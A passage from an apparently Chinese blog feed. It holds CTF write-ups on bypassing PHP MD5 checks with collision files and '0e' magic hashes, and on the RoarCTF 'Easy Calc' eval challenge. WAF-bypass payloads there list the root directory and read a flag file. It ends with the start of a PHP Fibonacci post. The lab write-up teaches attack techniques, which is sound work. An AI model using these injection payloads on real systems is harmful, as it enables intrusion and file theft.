<p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">fastcoll_v1.0.0.5.exe -o <span class="token number">0</span> <span class="token number">1</span>    -o参数代表随机生成两个相同MD5的文件
fastcoll_v1.0.0.5.exe -p <span class="token number">1</span> -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同
tail.exe -c <span class="token number">128</span> 00 <span class="token operator">></span> a    -c <span class="token number">128</span>代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因
tail.exe -c <span class="token number">128</span> 01 <span class="token operator">></span> b    同理
<span class="token builtin class-name">type</span> <span class="token number">0</span> a <span class="token operator">></span> <span class="token number">10</span>    这里表示将0和a文件的内容合并写入10
<span class="token builtin class-name">type</span> <span class="token number">0</span> b <span class="token operator">></span> <span class="token number">11</span>    这里表示将0和b文件的内容合并写入11</code></pre>

<p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm">tail.exe下载链接</a></p>
<p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt loading="lazy"></p>
<p>于是在PHP中生成其中三个的urlencode的值：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">function</span>  <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'二进制hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'二进制hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'二进制hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt loading="lazy"></p>
<pre class="language-HTML" data-language="HTML"><code class="language-HTML">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81

URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935

二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81

URLENCODE hash 6b9eaae07963a665dcc4cabcad530507

二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81

URLENCODE hash 559062db66b89ca9e98b3900fc75066e</code></pre>

<p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt loading="lazy"></p>
<p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p>
<p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p>
<p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p>
<p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
                        test1 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> test1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"0e"</span> <span class="token keyword">and</span> test1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test1<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">return</span>

<span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
                        test2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> test2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"e"</span> <span class="token keyword">and</span> test2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test2<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">return</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    a<span class="token punctuation">(</span><span class="token punctuation">)</span>
    b<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>得到的两个结果：</p>
<p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p>
<p>于是构造payload：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt loading="lazy"></p>
<p>发包得到flag</p>
<h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt loading="lazy"></p>
<p>查看源代码后发现存在<code>calc.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt loading="lazy"></p>
<p>访问得到后台源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p>
<blockquote>
<p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p>
</blockquote>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/6654#toc-1">从一道题到协议层攻击之HTTP请求走私</a></li>
<li><a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a></li>
<li><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></li>
</ul>
<h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote>
<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">num</span><span class="token operator">=</span>var_dump<span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token number">61693386291,10</span>,36<span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">num</span><span class="token operator">=</span>var_dump<span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token number">2146934604002,10</span>,36<span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>.base_convert<span class="token punctuation">(</span><span class="token number">25254448,10</span>,36<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt loading="lazy"></p>
<h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p>
<blockquote>
<ul>
<li>删除初始空格</li>
<li>将某些字符转换为下划线（包括空格）</li>
</ul>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">? <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">? <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
      </tags>
  </entry>
  <entry>
    <title>一些排序和查找算法</title>
    <url>/posts/3dae5dc2/</url>
    <content><![CDATA[<p>最近在看PHP的时候温习了一下原来学过的排序算法（忘的都差不多了-_-），故在此记录一下</p>
<span id="more"></span>

<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//打印数列</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印数列前15位</span>
<span class="token comment">//下面计算数列的第几位</span>
<span class="token keyword">function</span> <span class="token function-definition function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token variable">$n</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打印数列第15位</span></code></pre>

